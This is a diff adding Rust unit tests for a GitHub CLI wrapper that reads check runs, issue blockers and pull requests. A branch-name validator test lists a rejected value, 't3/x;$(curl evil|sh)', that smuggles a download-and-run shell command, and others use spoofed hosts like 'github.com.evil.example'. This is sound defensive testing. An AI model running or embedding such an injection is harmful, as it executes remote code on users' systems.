+                "repos/rawphp/softfac/commits/{BASE_SHA}/check-runs?per_page=100&filter=latest"
+            ),
+            "--paginate",
+            "--jq",
+            "[.check_runs[] | {name, status, conclusion, html_url}]",
+        ])
+    }
+
+    fn names(names: &[&str]) -> Vec<String> {
+        args(names)
+    }
+
+    /// The one check `gate` over `runs`.
+    fn gate(runs: &[serde_json::Value]) -> CheckStatus {
+        let fake = FakeTracker::answering([Answer::ok(page(runs))]);
+        checks(&fake, REPO, BASE_SHA, &names(&["gate"]))
+            .unwrap()
+            .remove(0)
+    }
+
+    #[test]
+    fn checks_reads_the_check_runs_of_the_commit_with_the_exact_call() {
+        let fake = FakeTracker::answering([Answer::ok(page(&[run(
+            "gate",
+            "completed",
+            Some("success"),
+        )]))]);
+        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
+        assert_eq!(fake.calls(), vec![checks_call()]);
+        assert_eq!(
+            got,
+            vec![CheckStatus {
+                name: "gate".into(),
+                state: CheckState::Passed,
+                conclusion: "success".into(),
+                url: Some("https://github.com/rawphp/softfac/actions/runs/1/job/gate".into()),
+            }]
+        );
+    }
+
+    #[test]
+    fn checks_answers_for_each_name_asked_in_the_order_asked_and_ignores_other_runs() {
+        let fake = FakeTracker::answering([Answer::ok(page(&[
+            run("lint", "completed", Some("success")),
+            run("other", "completed", Some("failure")),
+            run("gate", "completed", Some("success")),
+        ]))]);
+        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
+        assert_eq!(
+            got.iter()
+                .map(|c| (c.name.as_str(), c.state))
+                .collect::<Vec<_>>(),
+            vec![("gate", CheckState::Passed), ("lint", CheckState::Passed)]
+        );
+    }
+
+    #[test]
+    fn a_completed_run_passes_on_success_and_neutral_and_fails_on_anything_else() {
+        for conclusion in ["success", "neutral"] {
+            let got = gate(&[run("gate", "completed", Some(conclusion))]);
+            assert_eq!(got.state, CheckState::Passed, "{conclusion}");
+        }
+        for conclusion in [
+            "failure",
+            "cancelled",
+            "timed_out",
+            "action_required",
+            "stale",
+            "startup_failure",
+            "something_new",
+        ] {
+            let got = gate(&[run("gate", "completed", Some(conclusion))]);
+            assert_eq!(got.state, CheckState::Failed, "{conclusion}");
+            assert_eq!(got.conclusion, conclusion);
+        }
+        // Completed with no conclusion is not a pass.
+        let got = gate(&[run("gate", "completed", None)]);
+        assert_eq!(got.state, CheckState::Failed);
+        assert_eq!(got.conclusion, "completed");
+    }
+
+    #[test]
+    fn a_run_that_has_not_completed_is_pending() {
+        for status in ["queued", "in_progress", "waiting", "pending", "requested"] {
+            let got = gate(&[run("gate", status, None)]);
+            assert_eq!(got.state, CheckState::Pending, "{status}");
+            assert_eq!(got.conclusion, status);
+        }
+    }
+
+    #[test]
+    fn a_check_with_no_run_is_missing_and_not_pending() {
+        let fake = FakeTracker::answering([Answer::ok("[]")]);
+        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
+        assert_eq!(
+            got,
+            vec![CheckStatus {
+                name: "gate".into(),
+                state: CheckState::Missing,
+                conclusion: String::new(),
+                url: None,
+            }]
+        );
+    }
+
+    #[test]
+    fn a_name_that_is_not_exactly_the_runs_is_missing() {
+        let got = gate(&[run("Gate", "completed", Some("success"))]);
+        assert_eq!(got.state, CheckState::Missing);
+    }
+
+    #[test]
+    fn a_skipped_run_is_not_a_result_so_the_check_stays_missing() {
+        // The factory's pull request is a draft until the checks pass, and a job guarded by
+        // "not a draft" is skipped on it: nothing ran, so nothing passed.
+        let got = gate(&[run("gate", "completed", Some("skipped"))]);
+        assert_eq!(got.state, CheckState::Missing);
+        assert_eq!(got.conclusion, "skipped");
+    }
+
+    #[test]
+    fn several_runs_of_one_name_fail_before_they_pend_and_pend_before_they_pass() {
+        type Run = (&'static str, Option<&'static str>);
+        let state = |a: Run, b: Run| gate(&[run("gate", a.0, a.1), run("gate", b.0, b.1)]).state;
+        let success: Run = ("completed", Some("success"));
+        let neutral: Run = ("completed", Some("neutral"));
+        let failure: Run = ("completed", Some("failure"));
+        let skipped: Run = ("completed", Some("skipped"));
+        let going: Run = ("in_progress", None);
+        assert_eq!(state(success, failure), CheckState::Failed);
+        // The conclusion and the link are the deciding run's, whichever came first.
+        let mixed = gate(&[
+            run("gate", "completed", Some("success")),
+            with_url(
+                run("gate", "completed", Some("failure")),
+                "https://github.com/x/y/runs/2".into(),
+            ),
+        ]);
+        assert_eq!(
+            mixed,
+            CheckStatus {
+                name: "gate".into(),
+                state: CheckState::Failed,
+                conclusion: "failure".into(),
+                url: Some("https://github.com/x/y/runs/2".into()),
+            }
+        );
+        assert_eq!(state(going, success), CheckState::Pending);
+        assert_eq!(state(success, neutral), CheckState::Passed);
+        // A failure is not hidden by a run that is going again, in either order.
+        assert_eq!(state(failure, going), CheckState::Failed);
+        assert_eq!(state(going, failure), CheckState::Failed);
+        // One skipped run among passing ones is not every run passing.
+        assert_eq!(state(success, skipped), CheckState::Missing);
+        assert_eq!(state(skipped, success), CheckState::Missing);
+        // A skipped run does not hide one that is still going, or one that failed.
+        assert_eq!(state(skipped, going), CheckState::Pending);
+        assert_eq!(state(going, skipped), CheckState::Pending);
+        assert_eq!(state(skipped, failure), CheckState::Failed);
+        assert_eq!(state(failure, skipped), CheckState::Failed);
+    }
+
+    #[test]
+    fn of_several_runs_that_decide_alike_the_first_one_listed_is_reported() {
+        let got = gate(&[
+            with_url(
+                run("gate", "completed", Some("failure")),
+                "https://github.com/x/y/runs/1".into(),
+            ),
+            with_url(
+                run("gate", "completed", Some("cancelled")),
+                "https://github.com/x/y/runs/2".into(),
+            ),
+        ]);
+        assert_eq!(
+            got,
+            CheckStatus {
+                name: "gate".into(),
+                state: CheckState::Failed,
+                conclusion: "failure".into(),
+                url: Some("https://github.com/x/y/runs/1".into()),
+            }
+        );
+    }
+
+    #[test]
+    fn checks_reads_every_page() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "{}\n{}",
+            page(&[run("gate", "completed", Some("success"))]),
+            page(&[run("lint", "in_progress", None)])
+        ))]);
+        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
+        assert_eq!(got[0].state, CheckState::Passed);
+        assert_eq!(got[1].state, CheckState::Pending);
+    }
+
+    #[test]
+    fn checks_keeps_a_details_link_only_when_it_is_a_github_one() {
+        for url in [
+            "https://evil.example/x",
+            "https://github.com.evil.example/x",
+            "http://github.com/x",
+        ] {
+            let got = gate(&[with_url(
+                run("gate", "completed", Some("failure")),
+                url.into(),
+            )]);
+            assert_eq!(got.url, None, "{url}");
+        }
+        let none = gate(&[with_url(
+            run("gate", "completed", Some("failure")),
+            serde_json::Value::Null,
+        )]);
+        assert_eq!(none.url, None);
+    }
+
+    #[test]
+    fn checks_refuses_a_commit_that_is_not_a_full_id_before_any_call() {
+        for sha in [
+            String::new(),
+            "main".to_string(),
+            "9f8e7d6".to_string(),
+            "../x".to_string(),
+            BASE_SHA.replace('9', "g"),
+        ] {
+            let fake = FakeTracker::answering([Answer::ok("[]")]);
+            let error = checks(&fake, REPO, &sha, &names(&["gate"])).unwrap_err();
+            assert!(is_refused(&error), "{sha}: {error}");
+            assert!(fake.calls().is_empty(), "{sha}");
+        }
+    }
+
+    #[test]
+    fn checks_refuses_an_answer_that_is_not_a_list_of_runs() {
+        for answer in ["{}", "not json", "[{\"name\":\"gate\"}]"] {
+            let fake = FakeTracker::answering([Answer::ok(answer)]);
+            let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
+            assert!(is_parse(&error), "{answer}: {error}");
+        }
+    }
+
+    #[test]
+    fn checks_that_gh_cannot_read_is_the_gh_failure() {
+        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
+        let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
+        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
+    }
+
+    // Blockers.
+
+    fn blocked_by_call(issue: &str) -> Vec<String> {
+        args(&[
+            "api",
+            &format!("repos/rawphp/softfac/issues/{issue}/dependencies/blocked_by"),
+            "--paginate",
+        ])
+    }
+
+    fn blocker_row(number: u64, state: &str, repo: &str) -> String {
+        format!(
+            "{{\"id\":{number},\"number\":{number},\"state\":\"{state}\",\"title\":\"t\",\"repository_url\":\"https://api.github.com/repos/{repo}\",\"labels\":[]}}"
+        )
+    }
+
+    fn open_blocker(number: u64, repo: &str) -> Blocker {
+        Blocker {
+            repo: repo.into(),
+            number,
+        }
+    }
+
+    #[test]
+    fn an_issue_with_no_blockers_has_no_open_blockers() {
+        let fake = FakeTracker::answering([Answer::ok("[]")]);
+        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
+        assert_eq!(fake.calls(), vec![blocked_by_call("14")]);
+    }
+
+    #[test]
+    fn a_closed_blocker_is_resolved_whatever_closed_it() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "[{},{}]",
+            blocker_row(13, "closed", "rawphp/softfac"),
+            blocker_row(12, "closed", "rawphp/other")
+        ))]);
+        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
+    }
+
+    #[test]
+    fn only_the_exact_rest_state_closed_resolves_a_blocker_any_other_state_still_blocks() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "[{},{},{}]",
+            blocker_row(13, "unknown", "rawphp/softfac"),
+            blocker_row(12, "CLOSED", "rawphp/softfac"),
+            blocker_row(11, "closed", "rawphp/softfac")
+        ))]);
+        assert_eq!(
+            open_blockers(&fake, REPO, 14).unwrap(),
+            vec![
+                open_blocker(13, "rawphp/softfac"),
+                open_blocker(12, "rawphp/softfac")
+            ]
+        );
+    }
+
+    #[test]
+    fn open_blockers_keep_the_repo_they_are_in() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "[{},{},{}]",
+            blocker_row(13, "open", "rawphp/softfac"),
+            blocker_row(12, "closed", "rawphp/softfac"),
+            blocker_row(7, "open", "acme/widgets")
+        ))]);
+        assert_eq!(
+            open_blockers(&fake, REPO, 14).unwrap(),
+            vec![
+                open_blocker(13, "rawphp/softfac"),
+                open_blocker(7, "acme/widgets")
+            ]
+        );
+    }
+
+    #[test]
+    fn blockers_on_every_page_are_read() {
+        // `gh api --paginate` may print each page as its own array.
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "[{}][{}]",
+            blocker_row(1, "closed", "rawphp/softfac"),
+            blocker_row(2, "open", "rawphp/softfac")
+        ))]);
+        assert_eq!(
+            open_blockers(&fake, REPO, 14).unwrap(),
+            vec![open_blocker(2, "rawphp/softfac")]
+        );
+    }
+
+    #[test]
+    fn blockers_that_cannot_be_read_are_an_error() {
+        let spawn = FakeTracker::new();
+        let error = open_blockers(&spawn, REPO, 14).unwrap_err();
+        assert!(
+            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
+            "{error}"
+        );
+
+        let failed = FakeTracker::answering([Answer::fail(1, "Not Found")]);
+        assert!(is_failed(&open_blockers(&failed, REPO, 14).unwrap_err()));
+
+        for stdout in ["oops", "", "{\"message\":\"x\"}"] {
+            let fake = FakeTracker::answering([Answer::ok(stdout)]);
+            let error = open_blockers(&fake, REPO, 14).unwrap_err();
+            assert!(is_parse(&error), "{stdout}: {error}");
+        }
+    }
+
+    #[test]
+    fn an_open_blocker_whose_repo_is_unknown_is_an_error_not_a_guess() {
+        for row in [
+            "{\"number\":3,\"state\":\"open\"}",
+            "{\"number\":3,\"state\":\"open\",\"repository_url\":\"x\"}",
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(format!("[{row}]"))]);
+            let error = open_blockers(&fake, REPO, 14).unwrap_err();
+            assert!(is_parse(&error), "{row}: {error}");
+        }
+    }
+
+    fn body_call(issue: &str) -> Vec<String> {
+        args(&["issue", "view", issue, "--repo", REPO, "--json", "body"])
+    }
+
+    fn rest_call(repo: &str, issue: &str) -> Vec<String> {
+        args(&["api", &format!("repos/{repo}/issues/{issue}")])
+    }
+
+    fn body_reply(body: &str) -> String {
+        serde_json::json!({ "body": body }).to_string()
+    }
+
+    #[test]
+    fn text_blockers_of_a_body_without_the_section_read_nothing_more() {
+        let fake = FakeTracker::answering([Answer::ok(body_reply("## Cause\nSee #5\n"))]);
+        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
+        assert_eq!(fake.calls(), vec![body_call("14")]);
+
+        let empty = FakeTracker::answering([Answer::ok("{\"body\":null}")]);
+        assert_eq!(text_blockers(&empty, REPO, 14).unwrap(), vec![]);
+    }
+
+    #[test]
+    fn text_blockers_are_the_named_issues_that_are_not_closed() {
+        let fake = FakeTracker::answering([
+            Answer::ok(body_reply(
+                "## Depends on\n#13, acme/widgets#7 and #5\n\n## Fix\n#99\n",
+            )),
+            Answer::ok("{\"number\":13,\"state\":\"open\",\"title\":\"t\"}"),
+            Answer::ok("{\"number\":7,\"state\":\"closed\"}"),
+            Answer::ok("{\"number\":5,\"state\":\"open\"}"),
+        ]);
+        assert_eq!(
+            text_blockers(&fake, REPO, 14).unwrap(),
+            vec![open_blocker(13, REPO), open_blocker(5, REPO)]
+        );
+        assert_eq!(
+            fake.calls(),
+            vec![
+                body_call("14"),
+                rest_call(REPO, "13"),
+                rest_call("acme/widgets", "7"),
+                rest_call(REPO, "5"),
+            ]
+        );
+    }
+
+    #[test]
+    fn text_blockers_resolved_once_every_named_issue_is_closed() {
+        let fake = FakeTracker::answering([
+            Answer::ok(body_reply("## Depends on\n#13\n")),
+            Answer::ok("{\"state\":\"closed\"}"),
+        ]);
+        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
+    }
+
+    #[test]
+    fn only_the_exact_rest_state_closed_resolves_a_named_issue_any_other_still_blocks() {
+        let fake = FakeTracker::answering([
+            Answer::ok(body_reply("## Depends on\n#13, #12, #11\n")),
+            Answer::ok("{\"state\":\"CLOSED\"}"),
+            Answer::ok("{\"state\":\"unknown\"}"),
+            Answer::ok("{\"state\":\"closed\"}"),
+        ]);
+        assert_eq!(
+            text_blockers(&fake, REPO, 14).unwrap(),
+            vec![open_blocker(13, REPO), open_blocker(12, REPO)]
+        );
+    }
+
+    #[test]
+    fn a_depends_on_section_naming_more_than_the_cap_is_an_error_before_any_is_read() {
+        let refs = |count: usize| {
+            (1..=count)
+                .map(|at| format!("#{at}"))
+                .collect::<Vec<_>>()
+                .join(" ")
+        };
+
+        let over = FakeTracker::answering([Answer::ok(body_reply(&format!(
+            "## Depends on\n{}\n",
+            refs(MAX_DEPENDS_ON + 1)
+        )))]);
+        assert!(is_parse(&text_blockers(&over, REPO, 14).unwrap_err()));
+        assert_eq!(over.calls(), vec![body_call("14")]);
+
+        let at_cap = FakeTracker::answering(
+            std::iter::once(Answer::ok(body_reply(&format!(
+                "## Depends on\n{}\n",
+                refs(MAX_DEPENDS_ON)
+            ))))
+            .chain((0..MAX_DEPENDS_ON).map(|_| Answer::ok("{\"state\":\"closed\"}"))),
+        );
+        assert_eq!(text_blockers(&at_cap, REPO, 14).unwrap(), vec![]);
+        assert_eq!(at_cap.calls().len(), MAX_DEPENDS_ON + 1);
+    }
+
+    #[test]
+    fn a_named_issue_that_cannot_be_read_is_an_error_not_a_resolved_blocker() {
+        let body = body_reply("## Depends on\n#13, #5\n");
+        let missing = FakeTracker::answering([
+            Answer::ok(body.clone()),
+            Answer::ok("{\"state\":\"closed\"}"),
+            Answer::fail(1, "gh: Not Found (HTTP 404)"),
+        ]);
+        let error = text_blockers(&missing, REPO, 14).unwrap_err();
+        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
+
+        let oops = FakeTracker::answering([Answer::ok(body.clone()), Answer::ok("oops")]);
+        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));
+
+        let empty = FakeTracker::answering([Answer::ok(body), Answer::ok("{}")]);
+        assert!(is_parse(&text_blockers(&empty, REPO, 14).unwrap_err()));
+    }
+
+    #[test]
+    fn a_body_that_cannot_be_read_is_an_error() {
+        let failed = FakeTracker::answering([Answer::fail(1, "boom")]);
+        assert!(is_failed(&text_blockers(&failed, REPO, 14).unwrap_err()));
+        let oops = FakeTracker::answering([Answer::ok("oops")]);
+        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));
+    }
+
+    // Pull requests on a head.
+
+    const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";
+
+    fn listed_pr(number: u64, head: &str) -> String {
+        serde_json::json!({
+            "number": number,
+            "url": format!("https://github.com/rawphp/softfac/pull/{number}"),
+            "state": "OPEN",
+            "headRefName": head,
+            "baseRefName": "main",
+            "isCrossRepository": false,
+            "author": {"login": "rawphp"},
+        })
+        .to_string()
+    }
+
+    fn pr_list_call(head: &str) -> Vec<String> {
+        args(&[
+            "pr",
+            "list",
+            "--repo",
+            REPO,
+            "--state",
+            "open",
+            "--head",
+            head,
+            "--limit",
+            "100",
+            "--json",
+            PR_LIST_FIELDS,
+        ])
+    }
+
+    #[test]
+    fn open_pull_requests_on_head_lists_the_open_pull_requests_from_the_branch_with_the_exact_call()
+    {
+        // `gh pr list --json author` carries more than the login; a blank login is nobody.
+        let second = serde_json::json!({
+            "number": 15,
+            "url": "https://github.com/rawphp/softfac/pull/15",
+            "headRefName": "t3code/abc",
+            "baseRefName": "dev",
+            "isCrossRepository": true,
+            "author": {"id": "", "is_bot": false, "login": "", "name": ""},
+        });
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "[{},{second}]",
+            listed_pr(14, "t3code/abc")
+        ))]);
+        assert_eq!(
+            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
+            vec![
+                OpenPullRequest {
+                    number: 14,
+                    url: "https://github.com/rawphp/softfac/pull/14".into(),
+                    head_ref: "t3code/abc".into(),
+                    base_ref: "main".into(),
+                    cross_repository: false,
+                    author: Some("rawphp".into()),
+                },
+                OpenPullRequest {
+                    number: 15,
+                    url: "https://github.com/rawphp/softfac/pull/15".into(),
+                    head_ref: "t3code/abc".into(),
+                    base_ref: "dev".into(),
+                    cross_repository: true,
+                    author: None,
+                },
+            ]
+        );
+        assert_eq!(fake.calls(), vec![pr_list_call("t3code/abc")]);
+    }
+
+    #[test]
+    fn open_pull_requests_on_head_names_a_bot_author_as_app_slash_login() {
+        let bot = serde_json::json!({
+            "number": 16,
+            "url": "https://github.com/rawphp/softfac/pull/16",
+            "headRefName": "t3code/abc",
+            "baseRefName": "main",
+            "isCrossRepository": false,
+            "author": {"login": "dependabot", "__typename": "Bot"},
+        });
+        let fake = FakeTracker::answering([Answer::ok(format!("[{bot}]"))]);
+        let got = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap();
+        assert_eq!(got[0].author.as_deref(), Some("app/dependabot"));
+    }
+
+    #[test]
+    fn open_pull_requests_on_head_is_empty_when_the_branch_has_none() {
+        let fake = FakeTracker::answering([Answer::ok("[]")]);
+        assert_eq!(
+            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
+            vec![]
+        );
+    }
+
+    #[test]
+    fn open_pull_requests_on_head_refuses_a_branch_name_that_could_be_taken_for_an_option_before_calling_gh()
+     {
+        for head in ["-x", "--force", "a b", "a..b", "", "a\u{1}b"] {
+            let fake = FakeTracker::answering([Answer::ok("[]")]);
+            let error = open_pull_requests_on_head(&fake, REPO, head).unwrap_err();
+            assert!(is_refused(&error), "{head:?}: {error}");
+            assert!(fake.calls().is_empty(), "{head:?}");
+        }
+    }
+
+    #[test]
+    fn keep_a_plain_ref_name_safe_as_one_argument_to_git() {
+        for name in ["t3code/abc", "feat/x;y", "t3/x`y`"] {
+            assert!(is_plain_ref_name(name), "{name}");
+        }
+        for name in ["", "-x", "--force", "a b", "a..b", "a\u{1}b", "a\tb"] {
+            assert!(!is_plain_ref_name(name), "{name:?}");
+        }
+    }
+
+    #[test]
+    fn let_only_an_ordinary_branch_name_into_a_command_a_session_runs() {
+        for name in ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"] {
+            assert!(is_safe_branch_name(name), "{name}");
+        }
+        for name in [
+            "",
+            "-x",
+            "a b",
+            "a..b",
+            "feat/x;y",
+            "t3/x`y`",
+            "t3/x;$(curl evil|sh)",
+        ] {
+            assert!(!is_safe_branch_name(name), "{name:?}");
+        }
+    }
+
+    #[test]
+    fn a_branch_path_has_no_empty_or_dot_segment() {
+        for name in ["main", "release/1.0", "a/b/c"] {
+            assert!(is_branch_path(name), "{name}");
+        }
+        for name in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
+            assert!(!is_branch_path(name), "{name:?}");
+        }
+    }
+
+    #[test]
+    fn open_pull_requests_on_head_refuses_an_answer_it_cannot_read() {
+        for text in ["", "no", "{}", "[{\"number\":\"x\"}]"] {
+            let fake = FakeTracker::answering([Answer::ok(text)]);
+            let error = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap_err();
+            assert!(is_parse(&error), "{text}: {error}");
+        }
+    }
 
     // ----- End of part A tests -----
 
